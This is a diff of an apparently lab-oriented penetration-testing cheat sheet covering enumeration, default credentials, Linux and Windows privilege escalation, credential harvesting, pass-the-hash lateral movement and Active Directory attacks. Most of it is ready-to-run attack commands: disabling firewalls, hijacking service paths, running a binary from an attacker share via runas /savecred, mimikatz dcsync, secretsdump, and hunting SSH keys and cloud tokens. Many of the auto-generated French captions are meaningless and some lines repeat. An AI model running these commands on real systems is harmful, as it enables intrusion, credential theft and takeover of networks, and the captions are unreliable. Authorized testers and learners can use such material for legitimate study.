@@ -8,11 +8,6 @@ description: "Organiser les vérifications et la collecte des résultats."
 Organiser les vérifications et la collecte des résultats.
 
 
-## Services
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ### Scan initial
 
 Vérifier les ports et les services de la cible autorisée.
@@ -20,202 +15,95 @@ Vérifier les ports et les services de la cible autorisée.
 
 ### Méthodologie générale
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Tester ou établir une connexion réseau avec Netcat.
 
-```text
+```bash
 nc -v [ip] [port]
 ```
 
+
+Commande `telnet` pour la rubrique « Méthodologie générale ».
 
 ```text
 telnet [ip] [port]
 ```
 
 
-```text
-creds
-```
+**Paramètres et repères :**
+`site:github.com *Service version.release`  
 
 
-```text
-site:github.com *Service version.release
-```
-
+Commande `version` pour la rubrique « Méthodologie générale ».
 
 ```text
 version + github + exploit search
 ```
 
 
-```text
-admin:admin
-```
+**Paramètres et repères :**
+`admin:admin` · `admin:password` · `root:admin` · `root:password`  
+`root:root`  
 
 
-```text
-admin:password
-```
-
-
-```text
-root:admin
-```
-
-
-```text
-root:password
-```
-
-
-```text
-root:root
-```
-
+Exemple technique pour la rubrique « Méthodologie générale ».
 
 ```text
 [boxname]:admin
 ```
 
 
+Exemple technique pour la rubrique « Méthodologie générale ».
+
 ```text
 [boxname]:password
 ```
 
+
+Exemple technique pour la rubrique « Méthodologie générale ».
 
 ```text
 [appName]:[appName]
 ```
 
 
+Commande `admin` pour la rubrique « Méthodologie générale ».
+
 ```text
 admin:no pass
 ```
 
+
+Commande `root` pour la rubrique « Méthodologie générale ».
 
 ```text
 root:no pass
 ```
 
 
+Commande `pass` pour la rubrique « Méthodologie générale ».
+
 ```text
 pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret
 ```
 
 
-```text
-creds
-```
+**Paramètres et repères :**
+`sa` · `flare-floss` · `wget` · `binwalk`  
+`steghide` · `wireshark` · `exiftool` · `pdfcrack`  
+`zip2john` · `7z2john` · `dnSpy`  
 
 
-```text
-sa
-```
-
-
-```text
-office2john
-```
-
-
-```text
-strings
-```
-
-
-```text
-flare-floss
-```
-
-
-```bash
-wget
-```
-
-
-```text
-binwalk
-```
-
-
-```text
-strings
-```
-
-
-```text
-steghide
-```
-
-
-```text
-wireshark
-```
-
-
-```text
-exiftool
-```
-
-
-```text
-pdfcrack
-```
-
-
-```text
-exiftool
-```
-
-
-```text
-zip2john
-```
-
-
-```text
-7z2john
-```
-
-
-```text
-dnSpy
-```
-
+Commande `gpp` pour la rubrique « Méthodologie générale ».
 
 ```text
 gpp decrypt
 ```
 
 
-```text
-vncpwd
-```
-
-
-```text
-sqlite
-```
-
-
-```text
-.conf
-```
-
-
-```text
-.config
-```
-
-
-```text
-.xml
-```
-
-
-### Specific Services Strategy
-
-Commandes, paramètres et exemples associés à cette technique.
+**Paramètres et repères :**
+`vncpwd` · `sqlite` · `.conf` · `.config`  
+`.xml`  
 
 
 #### FTP (with Null Session)
@@ -223,67 +111,32 @@ Commandes, paramètres et exemples associés à cette technique.
 Transférer ou récupérer des fichiers dans le laboratoire.
 
 
-```text
-exiftool
-```
+**Paramètres et repères :**
+`exiftool` · `binary` · `.exe`  
 
 
-```text
-strings
-```
-
-
-```text
-binary
-```
-
-
-```text
-.exe
-```
-
+Commande `/var/ftp/anon/` pour la rubrique « FTP (with Null Session) ».
 
 ```text
 /var/ftp/anon/<directory-name-ifapplies>
 ```
 
 
-```text
-ftpusers
-```
-
-
-```text
-ftp.conf
-```
-
-
-```text
-proftpd.conf
-```
-
-
-```text
-users.xml
-```
-
-
-```text
-dotdotpwn
-```
+**Paramètres et repères :**
+`ftpusers` · `ftp.conf` · `proftpd.conf` · `users.xml`  
+`dotdotpwn`  
 
 
 #### SMTP
 
-Commandes, paramètres et exemples associés à cette technique.
 
+**Paramètres et repères :**
+`nmap`  
+
+
+Vérifier des identifiants dans un environnement autorisé.
 
 ```bash
-nmap
-```
-
-
-```text
 HYDRA SMTP ENUM
 ```
 
@@ -293,15 +146,11 @@ HYDRA SMTP ENUM
 Interroger les enregistrements DNS et identifier les services associés.
 
 
-```text
-autorecon
-```
+**Paramètres et repères :**
+`autorecon` · `nslookup`  
 
 
-```bash
-nslookup
-```
-
+Interroger les enregistrements DNS.
 
 ```bash
 dig axfr
@@ -313,20 +162,14 @@ dig axfr
 Examiner les objets, les droits et les services du domaine.
 
 
-```text
-kerbrute
-```
-
-
 #### POP3
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`LIST`  
 
 
-```text
-LIST
-```
-
+Commande `retr` pour la rubrique « POP3 ».
 
 ```text
 retr <number>
@@ -335,17 +178,9 @@ retr <number>
 
 #### RPC (with Null Session)
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-```text
-enumdomusers
-```
-
-
-```text
-enumprinters
-```
+**Paramètres et repères :**
+`enumdomusers` · `enumprinters`  
 
 
 #### SMB (with Null Session)
@@ -353,24 +188,15 @@ enumprinters
 Examiner les objets, les droits et les services du domaine.
 
 
-```text
-smbcacls
-```
+**Paramètres et repères :**
+`smbcacls`  
 
 
 #### SNMP
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-```bash
-nmap
-```
-
-
-```text
-snmpwalk
-```
+**Paramètres et repères :**
+`nmap` · `snmpwalk`  
 
 
 #### LDAP (with Null Session)
@@ -378,69 +204,30 @@ snmpwalk
 Examiner les objets, les droits et les services du domaine.
 
 
-```text
-ldapsearch
-```
-
+Commande `pwd` pour la rubrique « LDAP (with Null Session) ».
 
 ```text
 pwd
 ```
 
 
-```text
-Pwd
-```
-
-
-```text
-password
-```
-
-
-```text
-pass
-```
-
-
-```text
-Pass
-```
-
-
-```text
-ldapdomaindump
-```
+**Paramètres et repères :**
+`Pwd` · `password` · `pass` · `Pass`  
+`ldapdomaindump`  
 
 
 #### Redis (with Null Session)
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-```text
-/var/www/html/
-```
-
-
-```text
-module.so
-```
-
-
-#### Rsync (with Null Session)
-
-Commandes, paramètres et exemples associés à cette technique.
+**Paramètres et repères :**
+`/var/www/html/` · `module.so`  
 
 
 #### IRC
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-```text
-hexchat
-```
+**Paramètres et repères :**
+`hexchat`  
 
 
 ## Web
@@ -453,6 +240,8 @@ Examiner les entrées et les réponses de l'application web.
 Vérifier les ports et les services de la cible autorisée.
 
 
+Commande `apache` pour la rubrique « Scan initial ».
+
 ```text
 Apache 2.4.49
 ```
@@ -460,23 +249,12 @@ Apache 2.4.49
 
 ### Analyse de vulnérabilités
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`href` · `exiftool` · `html2markdown`  
 
 
-```text
-href
-```
-
-
-```text
-exiftool
-```
-
-
-```text
-html2markdown
-```
-
+Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -s http://[ip]/ | html2markdown
@@ -488,59 +266,20 @@ curl -s http://[ip]/ | html2markdown
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-```text
-username:username
-```
+**Paramètres et repères :**
+`username:username` · `username:password` · `pass` · `passwd`  
 
 
-```text
-username:password
-```
-
-
-```text
-pass
-```
-
-
-```text
-passwd
-```
-
+Commande `pwd` pour la rubrique « Énumération des utilisateurs and Credential Gathering ».
 
 ```text
 pwd
 ```
 
 
-```text
-user
-```
-
-
-```text
-usr
-```
-
-
-```text
-secret
-```
-
-
-```text
-cred
-```
-
-
-```text
-credential
-```
-
-
-```text
-auth
-```
+**Paramètres et repères :**
+`user` · `usr` · `secret` · `cred`  
+`credential` · `auth` (authentification)  
 
 
 ### CMS and Version Detection
@@ -548,15 +287,11 @@ auth
 Examiner les entrées et les réponses de l'application web.
 
 
-```text
-/etc/hosts
-```
+**Paramètres et repères :**
+`/etc/hosts` · `phpinfo`  
 
 
-```text
-phpinfo
-```
-
+Exemple technique pour la rubrique « CMS and Version Detection ».
 
 ```text
 $_SERVER[CONTEXT_DOCUMENT_ROOT]: [C:/xampp/htdocs]
@@ -565,52 +300,10 @@ $_SERVER[CONTEXT_DOCUMENT_ROOT]: [C:/xampp/htdocs]
 
 ### Technology-Specific Checks
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-```text
-changelog.txt
-```
-
-
-```text
-endpoint_path
-```
-
-
-```text
-kerbrute
-```
-
-
-```text
-kerberoasting
-```
-
-
-```text
-asproasting
-```
-
-
-```text
-master.key
-```
-
-
-```text
-root:
-```
-
-
-```text
-root:password
-```
-
-
-```text
-/manager
-```
+**Paramètres et repères :**
+`changelog.txt` · `endpoint_path` · `kerberoasting` · `asproasting`  
+`master.key` · `root:` · `root:password` · `/manager`  
 
 
 ### Enumerate Upload Capabilities
@@ -620,82 +313,45 @@ Examiner les entrées et les réponses de l'application web.
 
 ### Application Logic and Security Analysis
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-```text
-DoNotExist.php
-```
-
-
-```text
-DoNotExist.html
-```
-
-
-```text
-DoNotExist
-```
+**Paramètres et repères :**
+`DoNotExist.php` · `DoNotExist.html` · `DoNotExist`  
 
 
 ### Directory and File Énumération
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `/` pour la rubrique « Directory and File Énumération ».
 
 ```text
 /[boxName]
 ```
 
 
-```text
-/cgi-bin/
-```
+**Paramètres et repères :**
+`/cgi-bin/`  
 
+
+Examiner le service avec les scripts NSE sélectionnés.
 
 ```bash
 nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
 ```
 
 
-```text
-/cgi-bin/
-```
+**Paramètres et repères :**
+`/cgi-bin/` · `wfuzz` · `ffuf` · `forgot_pass.php`  
 
 
-```text
-wfuzz
-```
-
-
-```bash
-ffuf
-```
-
-
-```text
-forgot_pass.php
-```
-
+Commande `get` pour la rubrique « Directory and File Énumération ».
 
 ```text
 GET /forgot_pass.php?email=%0aid
 ```
 
 
-```text
-robots.txt
-```
-
-
-```text
-.svn
-```
-
-
-```text
-.DS_STORE
-```
+**Paramètres et repères :**
+`robots.txt` · `.svn` · `.DS_STORE`  
 
 
 ### Parameter Testing and Injection SQL
@@ -703,49 +359,19 @@ robots.txt
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-### Authentication and Login Forms
-
-Commandes, paramètres et exemples associés à cette technique.
+### Authentification and Login Forms
 
 
-```text
-creds
-```
-
+Commande `pip3` pour la rubrique « Authentification and Login Forms ».
 
 ```text
 pip3 install defaultcreds-cheat-sheet
 ```
 
 
-```text
-cewl
-```
-
-
-```text
-version:version
-```
-
-
-```text
-boxname:boxname
-```
-
-
-```text
-admin:version
-```
-
-
-```text
-name:version
-```
-
-
-## Élévation de privilèges
-
-Commandes, paramètres et exemples associés à cette technique.
+**Paramètres et repères :**
+`cewl` · `version:version` · `boxname:boxname` · `admin:version`  
+`name:version`  
 
 
 ### Linux
@@ -755,13 +381,15 @@ Examiner les permissions et la configuration de Linux.
 
 #### Principles to Becoming Root
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `-l` pour la rubrique « Principles to Becoming Root ».
 
 ```bash
 sudo -l
 ```
 
+
+Commande `cp` pour la rubrique « Principles to Becoming Root ».
 
 ```text
 cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
@@ -770,43 +398,30 @@ cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
 
 #### Énumération générale
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `ls` pour la rubrique « Énumération générale ».
 
 ```text
 ls -la
 ```
 
 
-```text
-root:root
-```
+**Paramètres et repères :**
+`root:root` · `linpeas.sh` · `PwnKit`  
 
 
-```text
-linpeas.sh
-```
-
-
-```text
-PwnKit
-```
-
+Commande `pass` pour la rubrique « Énumération générale ».
 
 ```text
 pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret
 ```
 
 
-```text
-/opt
-```
+**Paramètres et repères :**
+`/opt` · `/srv`  
 
 
-```text
-/srv
-```
-
+Rechercher ou filtrer des données.
 
 ```text
 find / -name "*.py"
@@ -815,13 +430,12 @@ find / -name "*.py"
 
 #### Configurations Files
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`/root/.ssh/id_rsa`  
 
 
-```text
-/root/.ssh/id_rsa
-```
-
+Exemple technique pour la rubrique « Configurations Files ».
 
 ```bash
 (env || set) 2>/dev/null
@@ -831,32 +445,20 @@ echo $PATH
 
 #### Services and Jobs
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`PSPY`  
 
 
-```text
-PSPY
-```
-
+Commande `mysql` pour la rubrique « Services and Jobs ».
 
 ```text
 mysql -uroot -pdasdasd
 ```
 
 
-```text
-Init
-```
-
-
-```text
-init.d
-```
-
-
-```text
-systemd
-```
+**Paramètres et repères :**
+`Init` · `init.d` · `systemd`  
 
 
 #### Credentials Search
@@ -864,25 +466,18 @@ systemd
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-```text
-/etc/passwd
-```
+**Paramètres et repères :**
+`/etc/passwd` · `/etc/shadow` · `/etc/sudoers`  
 
 
-```text
-/etc/shadow
-```
-
-
-```text
-/etc/sudoers
-```
-
+Commande `pass` pour la rubrique « Credentials Search ».
 
 ```text
 pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret
 ```
 
+
+Rechercher ou filtrer des données.
 
 ```bash
 grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
@@ -891,10 +486,7 @@ locate password | more
 ```
 
 
-```text
-strings
-```
-
+Commande `history` pour la rubrique « Credentials Search ».
 
 ```powershell
 history
@@ -902,16 +494,22 @@ cat ~/.bash_history
 ```
 
 
+Commande `history` pour la rubrique « Credentials Search ».
+
 ```bash
 history
 cat ~/.bash_history
 ```
 
 
+Commande `strings` pour la rubrique « Credentials Search ».
+
 ```bash
 strings /dev/mem -n10 | grep -i PASS
 ```
 
+
+Commande `cat` pour la rubrique « Credentials Search ».
 
 ```bash
 cat ~/.ssh/id_rsa
@@ -920,6 +518,8 @@ find / -name authorized_keys 2> /dev/null
 find / -name id_rsa 2> /dev/null
 ```
 
+
+Rechercher ou filtrer des données.
 
 ```bash
 find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
@@ -933,8 +533,8 @@ Observer les permissions et la configuration de Windows.
 
 #### General Énumération des utilisateurs
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Afficher des informations de la session ou du système.
 
 ```powershell
 whoami /all
@@ -947,6 +547,8 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
 
 
+Commande `net` pour la rubrique « General Énumération des utilisateurs ».
+
 ```powershell
 net localgroup
 net localgroup Administrators
@@ -955,28 +557,36 @@ net localgroup Administrators
 
 #### System Énumération
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Afficher des informations de la session ou du système.
 
 ```powershell
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 ```
 
 
+Commande `wmic` pour la rubrique « System Énumération ».
+
 ```powershell
 wmic qfe
 ```
 
 
-```powershell
-wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
-```
-
+Commande `wmic` pour la rubrique « System Énumération ».
 
 ```powershell
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
 ```
 
+
+Commande `wmic` pour la rubrique « System Énumération ».
+
+```powershell
+wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
+```
+
+
+Commande `wmic` pour la rubrique « System Énumération ».
 
 ```powershell
 wmic logicaldisk get caption || fsutil fsinfo drives
@@ -984,6 +594,8 @@ wmic logicaldisk get caption,description,providername
 Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
 ```
 
+
+Exemple technique pour la rubrique « System Énumération ».
 
 ```bash
 # List of exploits kernel https://github.com/SecWiki/windows-kernel-exploits
@@ -994,8 +606,8 @@ $ i586-mingw32msvc-gcc -o adduser.exe useradd.c
 
 #### Énumération réseau
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Afficher des informations de la session ou du système.
 
 ```powershell
 ipconfig /all
@@ -1004,11 +616,15 @@ Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 ```
 
 
+Commande `route` pour la rubrique « Énumération réseau ».
+
 ```powershell
 route print
 Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
 ```
 
+
+Commande `arp` pour la rubrique « Énumération réseau ».
 
 ```powershell
 arp -A
@@ -1016,15 +632,21 @@ Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,Stat
 ```
 
 
+Commande `netstat` pour la rubrique « Énumération réseau ».
+
 ```powershell
 netstat -ano
 ```
 
 
+Commande `netstat` pour la rubrique « Énumération réseau ».
+
 ```powershell
 netstat -bona
 ```
 
+
+Commande `netsh` pour la rubrique « Énumération réseau ».
 
 ```powershell
 netsh advfirewall firewall dump
@@ -1033,10 +655,14 @@ netsh firewall show config
 ```
 
 
+Exemple technique pour la rubrique « Énumération réseau ».
+
 ```powershell
 $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
 ```
 
+
+Commande `netsh` pour la rubrique « Énumération réseau ».
 
 ```powershell
 netsh advfirewall set allprofiles state off
@@ -1044,11 +670,15 @@ netsh firewall set opmode disable
 ```
 
 
+Commande `net` pour la rubrique « Énumération réseau ».
+
 ```powershell
 net share
 powershell Find-DomainShare -ComputerDomain domain.local
 ```
 
+
+Commande `reg` pour la rubrique « Énumération réseau ».
 
 ```powershell
 reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
@@ -1058,8 +688,8 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 
 #### Misconfigurations
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `sc` pour la rubrique « Misconfigurations ».
 
 ```powershell
 # using sc
@@ -1077,12 +707,16 @@ exploit/windows/local/service_permissions
 ```
 
 
+Commande `wmic` pour la rubrique « Misconfigurations ».
+
 ```powershell
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\" |findstr /i /v ""
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32\" |findstr /i /v "" #Not only auto services
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '*'} | select PathName,DisplayName,Name
 ```
 
+
+Commande `sc` pour la rubrique « Misconfigurations ».
 
 ```powershell
 # if the group "Authenticated users" has SERVICE_ALL_ACCESS
@@ -1105,6 +739,8 @@ net stop [service name] && net start [service name]
 ```
 
 
+Commande `for` pour la rubrique « Misconfigurations ».
+
 ```powershell
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
 for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
@@ -1115,6 +751,8 @@ FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Te
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
 
+
+Commande `reg` pour la rubrique « Misconfigurations ».
 
 ```powershell
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
@@ -1129,6 +767,8 @@ reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t RE
 ```
 
 
+Commande `dir` pour la rubrique « Misconfigurations ».
+
 ```powershell
 dir /a "C:\Program Files"
 dir /a "C:\Program Files (x86)"
@@ -1138,6 +778,8 @@ Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,Last
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
 
+
+Commande `accesschk.exe` pour la rubrique « Misconfigurations ».
 
 ```powershell
 # using accesschk.exe
@@ -1163,12 +805,16 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 ```
 
 
+Commande `for` pour la rubrique « Misconfigurations ».
+
 ```powershell
 # PATH DLL Hijacking
 # having write permissions inside a folder present ON PATH could bring to DLL hijacking
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\ everyone authenticated users todos %username%" && echo. )
 ```
 
+
+Commande `reg` pour la rubrique « Misconfigurations ».
 
 ```powershell
 # if both are enabled (set to 0x1), it's possible to execute
@@ -1190,6 +836,8 @@ msiexec /quiet /qn /i C:\Users\Homer.NUCLEAR\Downloads\donuts.msi
 ```
 
 
+Commande `schtasks` pour la rubrique « Misconfigurations ».
+
 ```powershell
 # using schtasks
 schtasks /query /fo LIST /v
@@ -1202,6 +850,8 @@ Get-ScheduledTask | ft TaskName,TaskPath,State
 Get-ScheduledTask | where {$_.TaskPath -nolike "\Microsoft*"} | ft TaskName,TaskPath,State
 ```
 
+
+Commande `wsl` pour la rubrique « Misconfigurations ».
 
 ```powershell
 wsl whoami
@@ -1216,11 +866,15 @@ wsl python -c 'put here your command'
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
+Commande `powershell.exe` pour la rubrique « Credential Access ».
+
 ```powershell
 # Using powershell
 powershell.exe Start-Process cmd.exe -Verb runAs
 ```
 
+
+Commande `c` pour la rubrique « Credential Access ».
 
 ```powershell
 # Check also with runas
@@ -1228,11 +882,15 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 ```
 
 
+Commande `dir` pour la rubrique « Credential Access ».
+
 ```powershell
 dir /s /b /p *pass* == *cred* == *vnc* == *.config* == *conf* == *ini*
 findstr /si /m password *.xml *.ini *.txt
 ```
 
+
+Commande `cmdkey` pour la rubrique « Credential Access ».
 
 ```powershell
 cmdkey /list
@@ -1240,6 +898,8 @@ cmdkey /list
 runas /savecred /user:WORKGROUP\Administrator "\\attacker-ip\SHARE\welcome.exe"
 ```
 
+
+Commande `reg` pour la rubrique « Credential Access ».
 
 ```powershell
 reg query HKLM /f pass /t REG_SZ /s
@@ -1268,6 +928,8 @@ reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
 ```
 
 
+Commande `c` pour la rubrique « Credential Access ».
+
 ```powershell
 c:\sysprep.inf
 c:\sysprep\sysprep.xml
@@ -1276,10 +938,14 @@ c:\sysprep\sysprep.xml
 ```
 
 
+Commande `dir` pour la rubrique « Credential Access ».
+
 ```powershell
 dir /s /b /p *access*.log* == *.log
 ```
 
+
+Commande `get-childitem` pour la rubrique « Credential Access ».
 
 ```powershell
 Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
@@ -1289,6 +955,8 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 C:\inetpub\wwwroot\web.config
 ```
 
+
+Commande `dir` pour la rubrique « Credential Access ».
 
 ```powershell
 dir c:*vnc.ini /s /b
@@ -1357,6 +1025,8 @@ TypedURLs #IE
 ```
 
 
+Commande `netsh` pour la rubrique « Credential Access ».
+
 ```powershell
 # 1. Find AP SSID
 netsh wlan show profile
@@ -1368,10 +1038,14 @@ cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| fi
 ```
 
 
+Commande `c` pour la rubrique « Credential Access ».
+
 ```powershell
 c:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
 ```
 
+
+Commande `import-module` pour la rubrique « Credential Access ».
 
 ```powershell
 # SessionGopher to grab PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP
@@ -1382,6 +1056,8 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm\-arvanaghi -p s3cr3tP@ss
 ```
 
 
+Commande `type` pour la rubrique « Credential Access ».
+
 ```powershell
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -1391,11 +1067,15 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 
 
+Commande `get-item` pour la rubrique « Credential Access ».
+
 ```powershell
 Get-Item -path <filename> -Stream *
 Get-Content -path <filename> -Stream <keyword>
 ```
 
+
+Exemple technique pour la rubrique « Credential Access ».
 
 ```powershell
 # Usually %SYSTEMROOT% = C:\Windows
@@ -1408,6 +1088,8 @@ Get-Content -path <filename> -Stream <keyword>
 ```
 
 
+Commande `.aws` pour la rubrique « Credential Access ».
+
 ```powershell
 # From user home
 .aws\credentials
@@ -1418,6 +1100,8 @@ AppData\Roaming\gcloud\access_tokens.db
 .azure\azureProfile.json
 ```
 
+
+Commande `c` pour la rubrique « Credential Access ».
 
 ```powershell
 # Before Vista look inside
@@ -1437,21 +1121,29 @@ gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 ```
 
 
+Commande `hkey_users` pour la rubrique « Credential Access ».
+
 ```powershell
 HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
 HKCU\Software\Microsoft\Terminal Server Client\Servers\
 ```
 
 
+Commande `remote` pour la rubrique « Credential Access ».
+
 ```text
 Remote desktop credential manager
 ```
 
 
+Exemple technique pour la rubrique « Credential Access ».
+
 ```powershell
  %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 ```
 
+
+Exemple technique pour la rubrique « Credential Access ».
 
 ```powershell
 # Check if the retrieved sotfwares are vulnerable to DLL Sideloading
@@ -1467,15 +1159,10 @@ else { Write "Not Installed." }
 Examiner les objets, les droits et les services du domaine.
 
 
-### External Machine
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 #### Énumération de base
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `hostname` pour la rubrique « Énumération de base ».
 
 ```powershell
 hostname
@@ -1483,15 +1170,18 @@ ipconfig /all
 ```
 
 
-```text
-inactive/legacy
-```
+**Paramètres et repères :**
+`inactive/legacy`  
 
+
+Commande `net` pour la rubrique « Énumération de base ».
 
 ```powershell
 net user
 ```
 
+
+Commande `net` pour la rubrique « Énumération de base ».
 
 ```powershell
 net view \\[external_machine_ip]
@@ -1500,13 +1190,15 @@ net view \\[external_machine_ip]
 
 #### Élévation de privilèges
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `sc` pour la rubrique « Élévation de privilèges ».
 
 ```powershell
 sc query state= all | findstr "SERVICE_NAME"
 ```
 
+
+Commande `dir` pour la rubrique « Élévation de privilèges ».
 
 ```powershell
 # Look for them in C:\\ProgramData, C:\\Users\\All Users, and application-specific folders like C:\\Program Files.
@@ -1515,10 +1207,11 @@ dir /s /b C:\\Users\\Public\\*.config
 ```
 
 
-```text
-impacket-secretsdump
-```
+**Paramètres et repères :**
+`impacket-secretsdump`  
 
+
+Commande `reg` pour la rubrique « Élévation de privilèges ».
 
 ```bash
 # Run in Windows
@@ -1530,15 +1223,10 @@ impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
 ```
 
 
-### Internal Machine
-
-Commandes, paramètres et exemples associés à cette technique.
+#### Mouvement latéral
 
 
-#### Lateral Movement
-
-Commandes, paramètres et exemples associés à cette technique.
-
+Commande `evil-winrm` pour la rubrique « Mouvement latéral ».
 
 ```bash
 # Evil-WinRM
@@ -1551,6 +1239,8 @@ impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:
 impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>@<target_ip>
 ```
 
+
+Commande `xfreerdp` pour la rubrique « Mouvement latéral ».
 
 ```bash
 # RDP
@@ -1569,18 +1259,12 @@ impacket-wmiexec <username>:<password>@<target_ip>
 
 #### Élévation de privilèges
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`cpassword` · `SYSVOL`  
 
 
-```text
-cpassword
-```
-
-
-```text
-SYSVOL
-```
-
+Commande `dir` pour la rubrique « Élévation de privilèges ».
 
 ```powershell
 # Check for cpassword in the SYSvol share to obtain cleartext passwords in XML files.
@@ -1591,30 +1275,32 @@ smbclient //dc-ip/SYSVOL -U "domain\username"
 ```
 
 
-```text
-SharpHound
-```
+**Paramètres et repères :**
+`SharpHound` · `BloodHound`  
 
 
-```text
-BloodHound
-```
-
+Commande `shortest` pour la rubrique « Élévation de privilèges ».
 
 ```text
 Shortest Path to Domain Admins
 ```
 
 
+Commande `.` pour la rubrique « Élévation de privilèges ».
+
 ```powershell
 .\\SharpHound.exe -c All -d <domain> -u <username> -p <password> -f AllData
 ```
 
 
+Commande `schtasks` pour la rubrique « Élévation de privilèges ».
+
 ```powershell
 schtasks /query /fo LIST /v
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```powershell
 # Test for WinRM
@@ -1640,48 +1326,34 @@ Examiner les objets, les droits et les services du domaine.
 
 #### Targeted AD Attacks on DC
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`mimikatz`  
 
 
-```text
-mimikatz
-```
-
+Commande `mimikatz` pour la rubrique « Targeted AD Attacks on DC ».
 
 ```powershell
 mimikatz # lsadump::dcsync /domain:<domain> /user:<target_user>
 ```
 
 
-```text
-NTDS.dit
-```
+**Paramètres et repères :**
+`NTDS.dit`  
 
 
-```text
-NTDS.dit
-```
-
